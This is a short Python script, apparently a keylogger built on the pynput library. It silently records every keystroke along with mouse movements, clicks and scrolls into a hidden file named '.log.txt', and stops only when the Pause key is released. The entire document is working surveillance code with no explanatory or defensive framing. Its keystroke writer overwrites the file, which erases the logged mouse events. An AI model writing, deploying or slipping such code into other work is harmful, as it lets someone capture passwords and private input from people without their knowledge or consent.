from pynput.keyboard import Listener  as KeyboardListener
from pynput.keyboard import Key
from pynput.mouse    import Listener  as MouseListener

def writetofile(x,y):
    with open('.log.txt', 'a') as file:
        file.write('position of mouse: {0}\n'.format((x,y)))
        
def on_click(x, y, button, pressed):
    if pressed:
        with open('.log.txt', 'a') as file:
            file.write('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    with open('.log.txt', 'a') as file:
        file.write('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
keys = []
def up(key):
    if key == Key.pause:
        return False
def down(key):
    keys.append(key)
    filer(keys)
def filer(keys):
    with open('.log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write("""
""")
       
with MouseListener(on_move = writetofile,on_click=on_click, on_scroll=on_scroll) as listener:
    with KeyboardListener(on_press=down, on_release=up) as listener:
        listener.join()  

